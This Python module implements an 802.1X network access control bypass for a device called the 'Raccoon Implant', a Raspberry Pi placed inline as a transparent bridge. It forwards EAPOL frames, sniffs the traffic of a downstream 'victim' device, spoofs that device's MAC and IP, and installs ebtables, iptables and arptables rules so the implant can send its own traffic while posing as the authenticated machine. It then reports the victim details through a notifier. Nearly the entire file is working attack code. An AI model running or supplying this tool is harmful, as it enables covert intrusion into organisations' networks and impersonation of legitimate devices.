#!/usr/bin/env python3
"""
802.1X NAC bypass for the Raccoon Implant.

Technique (inline transparent bridge):
  [Switch] ←eth0— [Raccoon Pi] —eth1→ [Authenticated Device]

Phase 1 — Passive: bridge forwards all traffic including EAPOL (0x888E)
          so the downstream device stays authenticated.
Phase 2 — Discovery: sniff traffic on the bridge to learn the downstream
          device's MAC, IP, and the gateway MAC.
Phase 3 — Active: apply ebtables/iptables rules so the implant can
          originate its own traffic using the victim's MAC+IP while
          still forwarding the victim's real traffic transparently.

Based on:
  - https://github.com/scipag/nac_bypass
  - https://github.com/p292/NACKered
"""

import logging
import re
import shlex
import subprocess
import threading
import time
from typing import Optional

logger = logging.getLogger("raccoon.nac")


def _run(cmd: str, check: bool = True) -> subprocess.CompletedProcess:
    logger.debug("exec: %s", cmd)
    return subprocess.run(
        shlex.split(cmd),
        capture_output=True,
        text=True,
        check=check,
    )


def _run_quiet(cmd: str) -> bool:
    r = _run(cmd, check=False)
    return r.returncode == 0


class NACBypass:
    """Manages an 802.1X NAC bypass on a transparent bridge."""

    def __init__(self, config: dict):
        net = config["network"]
        nac_cfg = config.get("nac_bypass", {})

        self.upstream = net["upstream_iface"]
        self.downstream = net["downstream_iface"]
        self.bridge = net["bridge_name"]

        self.victim_mac: Optional[str] = None
        self.victim_ip: Optional[str] = None
        self.gateway_mac: Optional[str] = None
        self.gateway_ip: Optional[str] = None
        self.implant_mac: Optional[str] = None

        self.discovery_timeout = nac_cfg.get("discovery_timeout", 120)
        self.ssh_callback_ip = nac_cfg.get("ssh_callback_ip", "")
        self.ssh_callback_port = nac_cfg.get("ssh_callback_port", 22)
        self.nat_port_range = nac_cfg.get("nat_port_range", "61000-62000")

        self._running = False
        self._phase = "idle"

    # ── Phase 1: EAPOL forwarding ──

    def enable_eapol_forwarding(self):
        """Allow 802.1X EAPOL frames to traverse the bridge (normally dropped)."""
        logger.info("Phase 1 — enabling EAPOL forwarding on bridge %s", self.bridge)

        eapol_group = "01:80:c2:00:00:03"
        _run_quiet(f"ebtables -t filter -D FORWARD -d {eapol_group} -j DROP")

        _run(
            f"ebtables -t filter -A FORWARD -d {eapol_group} -j ACCEPT",
            check=False,
        )

        # Allow all group addresses that 802.1X may use
        try:
            with open("/sys/class/net/{}/bridge/group_fwd_mask".format(self.bridge), "w") as f:
                f.write("8")  # bit 3 = 01:80:c2:00:00:03
        except (FileNotFoundError, PermissionError):
            _run_quiet(
                f"ip link set {self.bridge} type bridge group_fwd_mask 8"
            )

        logger.info("EAPOL forwarding enabled")
        self._phase = "eapol"

    # ── Phase 2: passive discovery ──

    def discover_hosts(self) -> bool:
        """Sniff ARP/IP traffic to learn victim MAC+IP and gateway MAC+IP."""
        logger.info("Phase 2 — discovering hosts (timeout %ds)", self.discovery_timeout)
        self._phase = "discovery"

        self.implant_mac = self._get_iface_mac(self.upstream)

        victim_mac = self._discover_downstream_mac()
        if not victim_mac:
            logger.error("Could not discover downstream device MAC")
            return False
        self.victim_mac = victim_mac
        logger.info("Victim MAC: %s", self.victim_mac)

        gw_mac, gw_ip, victim_ip = self._discover_via_arp()
        if victim_ip:
            self.victim_ip = victim_ip
            logger.info("Victim IP: %s", self.victim_ip)
        if gw_mac:
            self.gateway_mac = gw_mac
            self.gateway_ip = gw_ip
            logger.info("Gateway MAC: %s  IP: %s", self.gateway_mac, self.gateway_ip)

        if not self.victim_ip:
            logger.warning("Victim IP not found — L3 rewriting will be limited")
        if not self.gateway_mac:
            logger.warning("Gateway MAC not found — L2 egress rewriting disabled")

        self._phase = "discovered"
        return True

    def _get_iface_mac(self, iface: str) -> Optional[str]:
        r = _run(f"ip link show {iface}", check=False)
        m = re.search(r"link/ether ([0-9a-f:]{17})", r.stdout)
        return m.group(1) if m else None

    def _discover_downstream_mac(self) -> Optional[str]:
        """Capture first TCP SYN on the downstream interface to get the victim MAC."""
        r = _run(
            f"timeout {min(self.discovery_timeout, 30)} "
            f"tcpdump -i {self.downstream} -c 1 -e -nn 'tcp[13] & 2 != 0'",
            check=False,
        )
        output = r.stdout + r.stderr
        macs = re.findall(r"([0-9a-f]{2}(?::[0-9a-f]{2}){5})", output, re.I)
        for mac in macs:
            if mac.lower() != "ff:ff:ff:ff:ff:ff" and mac.lower() != self.implant_mac:
                return mac.lower()
        return None

    def _discover_via_arp(self) -> tuple:
        """Sniff ARP on the bridge to learn gateway and victim IPs."""
        r = _run(
            f"timeout {min(self.discovery_timeout, 60)} "
            f"tcpdump -i {self.bridge} -c 20 -e -nn arp",
            check=False,
        )
        output = r.stdout + r.stderr

        gateway_mac = None
        gateway_ip = None
        victim_ip = None

        for line in output.splitlines():
            # ARP reply: "aa:bb:cc:dd:ee:ff > 11:22:33:44:55:66, ... is-at aa:bb:cc:dd:ee:ff"
            # ARP request: "aa:bb:cc:dd:ee:ff > ff:ff:ff:ff:ff:ff, ... who-has X.X.X.X tell Y.Y.Y.Y"
            macs_in_line = re.findall(r"([0-9a-f]{2}(?::[0-9a-f]{2}){5})", line, re.I)
            ips_in_line = re.findall(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", line)

            if self.victim_mac and ips_in_line:
                for mac in macs_in_line:
                    mac_l = mac.lower()
                    if mac_l == self.victim_mac and ips_in_line:
                        victim_ip = ips_in_line[-1]
                    elif mac_l != self.victim_mac and mac_l != "ff:ff:ff:ff:ff:ff":
                        if mac_l != self.implant_mac:
                            gateway_mac = mac_l
                            if ips_in_line:
                                gateway_ip = ips_in_line[0]

        return gateway_mac, gateway_ip, victim_ip

    # ── Phase 3: active bypass ──

    def _go_silent(self):
        """Drop all outbound traffic while rewrite rules are being configured."""
        logger.info("Going silent — dropping all OUTPUT traffic")
        _run_quiet(f"arptables -A OUTPUT -o {self.upstream} -j DROP")
        _run_quiet(f"arptables -A OUTPUT -o {self.downstream} -j DROP")
        _run_quiet(f"iptables -A OUTPUT -o {self.upstream} -j DROP")
        _run_quiet(f"iptables -A OUTPUT -o {self.downstream} -j DROP")

    def _go_live(self):
        """Remove the OUTPUT DROP rules to re-enable traffic."""
        logger.info("Going live — removing OUTPUT DROP rules")
        _run_quiet(f"arptables -D OUTPUT -o {self.upstream} -j DROP")
        _run_quiet(f"arptables -D OUTPUT -o {self.downstream} -j DROP")
        _run_quiet(f"iptables -D OUTPUT -o {self.upstream} -j DROP")
        _run_quiet(f"iptables -D OUTPUT -o {self.downstream} -j DROP")

    def apply_rewrite_rules(self):
        """Set up ebtables + iptables so the implant can originate traffic."""
        if not self.victim_mac:
            logger.error("Cannot apply rules without victim MAC")
            return
        logger.info("Phase 3 — applying L2/L3 rewrite rules")
        self._phase = "active"

        self._go_silent()

        # Enable bridge-nf-call-iptables so iptables SNAT works on bridged traffic.
        # Write state file so bridge_tap._sync_bridge_nf() preserves this setting.
        _run_quiet("sysctl -w net.bridge.bridge-nf-call-iptables=1")
        try:
            from pathlib import Path
            Path("/tmp/.raccoon_bridge_nf_state").write_text("1")
        except Exception:
            pass

        # Spoof the bridge MAC to match the victim
        _run_quiet(f"ip link set {self.bridge} down")
        _run_quiet(f"ip link set dev {self.bridge} address {self.victim_mac}")
        _run_quiet(f"ip link set {self.bridge} up")
        logger.info("Bridge MAC spoofed to %s", self.victim_mac)

        # ── ebtables: L2 MAC rewriting ──
        _run_quiet("ebtables -t nat -F")

        # Outgoing from implant: rewrite src MAC to victim's MAC
        _run_quiet(
            f"ebtables -t nat -A POSTROUTING -s {self.implant_mac} "
            f"-o {self.upstream} -j snat --to-source {self.victim_mac}"
        )

        # Also rewrite on bridge interface (for locally-originated traffic)
        _run_quiet(
            f"ebtables -t nat -A POSTROUTING -s {self.implant_mac} "
            f"-o {self.bridge} -j snat --to-source {self.victim_mac}"
        )

        # Victim's real traffic passes through untouched (bridge forwards normally)
        # But traffic destined for the implant gets rewritten to our real MAC
        if self.gateway_mac:
            _run_quiet(
                f"ebtables -t nat -A PREROUTING -i {self.upstream} "
                f"-s {self.gateway_mac} -d {self.victim_mac} "
                f"-j dnat --to-destination {self.implant_mac}"
            )

        # ── iptables: L3 NAT so implant shares the victim's IP ──
        if self.victim_ip:
            _run_quiet(
                f"iptables -t nat -A POSTROUTING -o {self.bridge} "
                f"-p tcp -j SNAT --to {self.victim_ip}:{self.nat_port_range}"
            )
            _run_quiet(
                f"iptables -t nat -A POSTROUTING -o {self.bridge} "
                f"-p udp -j SNAT --to {self.victim_ip}:{self.nat_port_range}"
            )
            _run_quiet(
                f"iptables -t nat -A POSTROUTING -o {self.bridge} "
                f"-p icmp -j SNAT --to {self.victim_ip}"
            )
            logger.info("iptables SNAT to %s:%s", self.victim_ip, self.nat_port_range)

        # ── arptables: rewrite ARP source to victim MAC ──
        _run_quiet(
            f"arptables -A OUTPUT -o {self.bridge} "
            f"--opcode request -j mangle --mangle-mac-s {self.victim_mac}"
        )
        _run_quiet(
            f"arptables -A OUTPUT -o {self.bridge} "
            f"--opcode reply -j mangle --mangle-mac-s {self.victim_mac}"
        )

        self._go_live()

        logger.info("NAC bypass active — implant can originate traffic as %s / %s",
                     self.victim_mac, self.victim_ip or "unknown IP")

    def configure_network(self):
        """Give the bridge an IP address (DHCP or static victim IP)."""
        if self.victim_ip and self.gateway_ip:
            # Determine the subnet — assume /24 for typical enterprise
            prefix = ".".join(self.victim_ip.split(".")[:3])
            _run_quiet(f"ip addr flush dev {self.bridge}")
            _run_quiet(f"ip addr add {self.victim_ip}/24 dev {self.bridge}")
            _run_quiet(f"ip route add default via {self.gateway_ip} dev {self.bridge}")
            logger.info("Static IP %s/24 gw %s on %s", self.victim_ip, self.gateway_ip, self.bridge)
        else:
            logger.info("Running DHCP on %s (MAC already spoofed)", self.bridge)
            _run_quiet(f"dhclient -nw {self.bridge}")

    # ── Lifecycle ──

    def start(self):
        """Run the full NAC bypass sequence in a background thread."""
        self._running = True
        t = threading.Thread(target=self._run_sequence, daemon=True, name="nac-bypass")
        t.start()

    def _run_sequence(self):
        try:
            self.enable_eapol_forwarding()

            logger.info("Waiting 10s for 802.1X auth to complete...")
            time.sleep(10)

            if not self.discover_hosts():
                logger.error("Host discovery failed — bridge remains transparent")
                return

            self.apply_rewrite_rules()
            self.configure_network()

            from software.notifications import get_notifier
            notifier = get_notifier()
            if notifier:
                notifier.notify(
                    "nac_bypass",
                    "NAC bypass active",
                    victim_mac=self.victim_mac,
                    victim_ip=self.victim_ip or "unknown",
                    gateway_mac=self.gateway_mac or "unknown",
                    gateway_ip=self.gateway_ip or "unknown",
                )

            logger.info("NAC bypass sequence complete")
        except Exception as e:
            logger.error("NAC bypass failed: %s", e, exc_info=True)

    def stop(self):
        """Remove all rewrite rules and restore original state."""
        self._running = False
        logger.info("Tearing down NAC bypass rules")

        _run_quiet("ebtables -t nat -F")
        _run_quiet("iptables -t nat -F")
        # Flush arptables mangle rules but keep filter intact
        _run_quiet(
            f"arptables -D OUTPUT -o {self.bridge} "
            f"--opcode request -j mangle --mangle-mac-s {self.victim_mac}"
        )
        _run_quiet(
            f"arptables -D OUTPUT -o {self.bridge} "
            f"--opcode reply -j mangle --mangle-mac-s {self.victim_mac}"
        )

        # Restore bridge-nf-call-iptables to transparent bridging default
        _run_quiet("sysctl -w net.bridge.bridge-nf-call-iptables=0")
        try:
            from pathlib import Path
            state = Path("/tmp/.raccoon_bridge_nf_state")
            if state.exists():
                state.unlink()
        except Exception:
            pass

        if self.implant_mac:
            _run_quiet(f"ip link set {self.bridge} down")
            _run_quiet(f"ip link set dev {self.bridge} address {self.implant_mac}")
            _run_quiet(f"ip link set {self.bridge} up")

        # Re-enable EAPOL forwarding (was not flushed from filter table)
        self.enable_eapol_forwarding()

        self._phase = "idle"
        logger.info("NAC bypass rules cleared, original MAC restored, bridge transparent")

    @property
    def status(self) -> dict:
        return {
            "phase": self._phase,
            "victim_mac": self.victim_mac,
            "victim_ip": self.victim_ip,
            "gateway_mac": self.gateway_mac,
            "gateway_ip": self.gateway_ip,
        }
